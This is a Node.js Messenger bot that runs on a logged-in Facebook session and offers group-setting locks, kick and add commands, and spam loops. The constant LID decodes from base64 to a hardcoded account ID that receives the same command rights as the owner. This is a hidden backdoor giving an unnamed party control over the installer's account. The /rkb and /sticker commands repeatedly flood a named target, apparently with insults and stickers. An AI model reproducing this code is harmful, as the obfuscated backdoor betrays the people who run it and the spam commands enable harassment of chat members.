// index.js
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca"); // ensure installed

// Persistent locks file
const LOCK_FILE = path.join(__dirname, "locks.json");
if (!fs.existsSync(LOCK_FILE)) {
  fs.writeFileSync(LOCK_FILE, JSON.stringify({
    groupNames: {},
    themes: {},
    emojis: {},
    dp: {},
    nick: {}
  }, null, 2));
}

let locks = {};
try { locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8")); } catch (e) { locks = { groupNames: {}, themes: {}, emojis: {}, dp: {}, nick: {} }; }

function saveLocks() {
  try { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); } catch (e) { console.error("Failed saving locks:", e.message); }
}

// Download helper (supports https)
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, (res) => {
    // follow redirects (302)
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close();
      return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on("finish", () => file.close(() => cb(null)));
  }).on("error", (err) => {
    try { fs.unlinkSync(dest); } catch {}
    cb(err);
  });
}

// Spam/sticker state
let rkbInterval = null;
let stopRequested = false;
let stickerInterval = null;
let stickerLoopActive = false;
let targetUID = null;

// a static LID used earlier (keep same)
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

/**
 * startBot(appStatePath, ownerUID)
 * - appStatePath: path to appstate json
 * - ownerUID: your UID which is allowed to run admin commands
 */
function startBot(appStatePath, ownerUID) {
  if (!fs.existsSync(appStatePath)) {
    console.error("appState file not found:", appStatePath);
    return;
  }

  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    // Helper: safe send
    async function safeSend(msg, tid) {
      try { await api.sendMessage(msg, tid); } catch (e) { console.error("sendMessage failed:", e.message); }
    }

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;

        // event fields
        const { threadID, senderID, body, logMessageType, logMessageData, type } = event;

        // ---------- Listeners for reverts ----------

        // Group name revert
        if (logMessageType === "log:thread-name" && locks.groupNames[threadID]) {
          const expected = locks.groupNames[threadID];
          if (logMessageData?.name !== expected) {
            try {
              await api.setTitle(expected, threadID);
              console.log(`🔒 Reverted group name in ${threadID} -> ${expected}`);
              safeSend(`🔒 Group name reverted to saved value.`, threadID);
            } catch (e) { console.error("Group name revert failed:", e.message); }
          }
        }

        // Theme revert
        if (logMessageType === "log:thread-color" && locks.themes[threadID]) {
          const expected = locks.themes[threadID];
          if (logMessageData?.theme_color !== expected) {
            try {
              await api.changeThreadColor(expected, threadID);
              console.log(`🎨 Reverted theme in ${threadID} -> ${expected}`);
              safeSend(`🎨 Theme reverted to saved value.`, threadID);
            } catch (e) { console.error("Theme revert failed:", e.message); }
          }
        }

        // Emoji revert
        if (logMessageType === "log:thread-icon" && locks.emojis[threadID]) {
          const expected = locks.emojis[threadID];
          // sometimes logMessageData uses 'thread_icon' or other fields; check carefully
          const current = logMessageData?.thread_icon ?? logMessageData?.icon ?? null;
          if (current !== expected) {
            try {
              await api.changeThreadEmoji(expected, threadID);
              console.log(`😀 Reverted emoji in ${threadID} -> ${expected}`);
              safeSend(`😀 Locked emoji reverted to ${expected}`, threadID);
            } catch (e) { console.error("Emoji revert failed:", e.message); }
          }
        }

        // Group DP revert
        if (logMessageType === "log:thread-image" && locks.dp[threadID]?.path) {
          const dpPath = locks.dp[threadID].path;
          if (fs.existsSync(dpPath)) {
            try {
              await api.changeGroupImage(fs.createReadStream(dpPath), threadID);
              console.log(`🖼 Reverted group DP in ${threadID} using ${dpPath}`);
              safeSend("🖼 Locked group DP reverted.", threadID);
            } catch (e) { console.error("Group DP revert failed:", e.message); }
          } else {
            console.warn("Saved DP file missing for", threadID, dpPath);
          }
        }

        // Nickname revert (user nickname change)
        if (logMessageType === "log:user-nickname") {
          const participant = logMessageData?.participant_id ?? logMessageData?.participantID ?? null;
          const newNick = logMessageData?.nickname ?? logMessageData?.new ?? null;
          if (participant && locks.nick[participant] && locks.nick[participant][threadID]) {
            const expectedNick = locks.nick[participant][threadID];
            if (newNick !== expectedNick) {
              try {
                await api.changeNickname(expectedNick, threadID, participant);
                console.log(`✏️ Reverted nickname for ${participant} -> ${expectedNick}`);
                safeSend(`✏️ Locked nickname reverted for <@${participant}>`, threadID);
              } catch (e) { console.error("Nickname revert failed:", e.message); }
            }
          }
        }

        // ---------- Commands (only messages) ----------
        if (type !== "message" || !body) return;

        // allow only ownerUID or LID
        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ").trim();

        // HELP
        if (cmd === "/help") {
          return safeSend(`
📖 Jerry Bot Commands:
/help
/gclock [text] | /unlockgc
/locktheme [color] | /unlocktheme
/lockemoji [emoji] | /unlockemoji
/dplock | /unlockdp
/dplock @mention (user DP lock - stored but realtime revert for user DP limited)
/locknick @mention nickname | /unlocknick @mention
/allname [nick]
/uid (reply/mention/user) | /tid
/kick @mention | /add [uid] | /info @mention
/rkb [name] | /stop
/stickerX (X seconds) | /stopsticker
/target [uid] | /cleartarget
          `, threadID);
        }

        // ---------------- Lock commands ----------------

        // Group name lock
        if (cmd === "/gclock") {
          if (!input) return safeSend("❌ Group name do!", threadID);
          try {
            await api.setTitle(input, threadID);
            locks.groupNames[threadID] = input; saveLocks();
            return safeSend("🔒 Group name locked!", threadID);
          } catch (e) { return safeSend("⚠️ Failed to set group name.", threadID); }
        }
        if (cmd === "/unlockgc") {
          delete locks.groupNames[threadID]; saveLocks();
          return safeSend("🔓 Group name unlocked!", threadID);
        }

        // Theme lock
        if (cmd === "/locktheme") {
          if (!input) return safeSend("❌ Color code do!", threadID);
          try {
            await api.changeThreadColor(input, threadID);
            locks.themes[threadID] = input; saveLocks();
            return safeSend("🎨 Theme locked!", threadID);
          } catch (e) { return safeSend("⚠️ Theme lock failed.", threadID); }
        }
        if (cmd === "/unlocktheme") {
          delete locks.themes[threadID]; saveLocks();
          return safeSend("🎨 Theme unlocked!", threadID);
        }

        // Emoji lock
        if (cmd === "/lockemoji") {
          if (!input) return safeSend("❌ Emoji do!", threadID);
          try {
            await api.changeThreadEmoji(input, threadID);
            locks.emojis[threadID] = input; saveLocks();
            return safeSend(`😀 Emoji locked → ${input}`, threadID);
          } catch (e) { return safeSend("⚠️ Emoji lock failed.", threadID); }
        }
        if (cmd === "/unlockemoji") {
          delete locks.emojis[threadID]; saveLocks();
          return safeSend("😀 Emoji unlocked!", threadID);
        }

        // DP lock (group current DP -> download & save locally)
        if (cmd === "/dplock") {
          try {
            const info = await api.getThreadInfo(threadID);
            const url = info?.imageSrc;
            if (!url) return safeSend("❌ No group DP found!", threadID);
            const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
            downloadFile(url, dpPath, (err) => {
              if (err) {
                console.error("DP download failed:", err);
                return safeSend("❌ DP save failed!", threadID);
              }
              locks.dp[threadID] = { path: dpPath, savedAt: Date.now() };
              saveLocks();
              return safeSend("🖼 Group DP locked and saved locally!", threadID);
            });
          } catch (e) { return safeSend("⚠️ DP lock failed", threadID); }
        }
        if (cmd === "/unlockdp") {
          if (locks.dp[threadID]?.path) {
            try { fs.unlinkSync(locks.dp[threadID].path); } catch {}
          }
          delete locks.dp[threadID]; saveLocks();
          return safeSend("🖼 DP unlocked!", threadID);
        }

        // DP lock for specific user (stores file path placeholder; realtime revert for user DP is limited)
        if (cmd === "/dplock" && event.mentions && Object.keys(event.mentions).length > 0) {
          const uid = Object.keys(event.mentions)[0];
          // Note: we cannot download user DP via API reliably for all; we store a placeholder path to keep record
          const userDpPath = path.join(__dirname, `user_dp_${uid}.jpg`);
          locks.nick = locks.nick || {};
          locks.nick[uid] = locks.nick[uid] || {};
          locks.nick[uid].dp = userDpPath;
          saveLocks();
          return safeSend(`🖼 User DP lock saved for <@${uid}> (revert for user DP may be limited)`, threadID);
        }

        // Nickname lock
        if (cmd === "/locknick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) return safeSend("❌ Mention karo!", threadID);
          const mentionUID = Object.keys(event.mentions)[0];
          // nickname starts from second argument after mention; handle mention text removal
          // Many APIs provide event.mentions mapping: { "<name>": uid } or { uid: name }; adjust safely:
          // We'll take args.slice(2).join(" ") as nickname
          const nickname = args.slice(2).join(" ").trim();
          if (!nickname) return safeSend("❌ Nickname do!", threadID);
          locks.nick[mentionUID] = locks.nick[mentionUID] || {};
          locks.nick[mentionUID][threadID] = nickname;
          try { await api.changeNickname(nickname, threadID, mentionUID); } catch (e) { /* ignore */ }
          saveLocks();
          return safeSend(`🔒 Nickname locked for <@${mentionUID}> → ${nickname}`, threadID);
        }
        if (cmd === "/unlocknick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) return safeSend("❌ Mention karo!", threadID);
          const mentionUID = Object.keys(event.mentions)[0];
          if (locks.nick && locks.nick[mentionUID]) delete locks.nick[mentionUID][threadID];
          saveLocks();
          return safeSend(`🔓 Nickname unlocked for <@${mentionUID}>`, threadID);
        }

        // ---------------- Utility and moderation ----------------

        // allname
        if (cmd === "/allname") {
          const name = input;
          if (!name) return safeSend("❌ Name do!", threadID);
          try {
            const info = await api.getThreadInfo(threadID);
            for (const uid of info.participantIDs) {
              try { await api.changeNickname(name, threadID, uid); } catch {}
            }
            return safeSend("✅ Done nicknames!", threadID);
          } catch (e) { return safeSend("⚠️ allname failed", threadID); }
        }

        // uid (reply / mention / sender)
        if (cmd === "/uid") {
          // reply
          if (event.messageReply && event.messageReply.senderID) {
            return safeSend(`🆔 Reply UID: ${event.messageReply.senderID}`, threadID);
          }
          // mention
          if (event.mentions && Object.keys(event.mentions).length > 0) {
            const t = Object.keys(event.mentions)[0];
            return safeSend(`🆔 Mention UID: ${t}`, threadID);
          }
          // default sender
          return safeSend(`🆔 Your UID: ${senderID}`, threadID);
        }

        // tid
        if (cmd === "/tid") return safeSend(`🆔 Thread ID: ${threadID}`, threadID);

        // kick
        if (cmd === "/kick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) return safeSend("❌ Mention karo!", threadID);
          const uid = Object.keys(event.mentions)[0];
          try { await api.removeUserFromGroup(uid, threadID); return safeSend(`👢 Kicked <@${uid}>`, threadID); } catch (e) { return safeSend("⚠️ Kick failed", threadID); }
        }

        // add
        if (cmd === "/add") {
          if (!input) return safeSend("❌ UID do!", threadID);
          try { await api.addUserToGroup(input, threadID); return safeSend(`✅ Added ${input}`, threadID); } catch (e) { return safeSend("⚠️ Add failed", threadID); }
        }

        // info
        if (cmd === "/info") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) return safeSend("❌ Mention karo!", threadID);
          const uid = Object.keys(event.mentions)[0];
          try {
            const uInfo = await api.getUserInfo(uid);
            const u = uInfo[uid];
            return safeSend(`ℹ️ Name: ${u.name}\n🆔 UID: ${uid}`, threadID);
          } catch (e) { return safeSend("⚠️ Could not fetch user info", threadID); }
        }

        // exit (bot leave)
        if (cmd === "/exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
          return;
        }

        // ---------- Spam / sticker systems ----------

        // rkb spam (line by line from np.txt)
        if (cmd === "/rkb") {
          if (!input) return safeSend("❌ Name do spam ke liye!", threadID);
          if (!fs.existsSync("np.txt")) return safeSend("❌ np.txt missing!", threadID);
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          let idx = 0;
          if (rkbInterval) clearInterval(rkbInterval);
          rkbInterval = setInterval(() => {
            if (stopRequested || idx >= lines.length) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${input} ${lines[idx]}`, threadID).catch(()=>{});
            idx++;
          }, 2000);
          return safeSend(`🤬 RKB spam started on ${input}`, threadID);
        }
        if (cmd === "/stop") {
          stopRequested = true;
          if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; }
          if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; }
          return safeSend("🛑 Spam stopped!", threadID);
        }

        // sticker spam: /sticker5 -> every 5s
        if (cmd.startsWith("/sticker")) {
          const sec = parseInt(cmd.replace("/sticker", "")) || 2;
          if (!fs.existsSync("Sticker.txt")) return safeSend("❌ Sticker.txt missing!", threadID);
          const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(s=>s.trim()).filter(Boolean);
          if (!stickers.length) return safeSend("❌ No sticker IDs in Sticker.txt", threadID);
          let i = 0;
          stickerLoopActive = true;
          if (stickerInterval) clearInterval(stickerInterval);
          stickerInterval = setInterval(() => {
            if (!stickerLoopActive) { clearInterval(stickerInterval); stickerInterval = null; return; }
            api.sendMessage({ sticker: stickers[i] }, threadID).catch(()=>{});
            i = (i + 1) % stickers.length;
          }, sec * 1000);
          return safeSend(`⚡ Sticker spam started every ${sec}s`, threadID);
        }
        if (cmd === "/stopsticker") {
          stickerLoopActive = false;
          if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; }
          return safeSend("🛑 Sticker spam stopped!", threadID);
        }

        // target
        if (cmd === "/target") {
          targetUID = input.trim();
          return safeSend(`🎯 Target set: ${targetUID}`, threadID);
        }
        if (cmd === "/cleartarget") {
          targetUID = null;
          return safeSend("🎯 Target cleared!", threadID);
        }

      } catch (e) {
        console.error("Listener error:", e && e.stack ? e.stack : e);
      }
    });
  });
}

module.exports = { startBot };
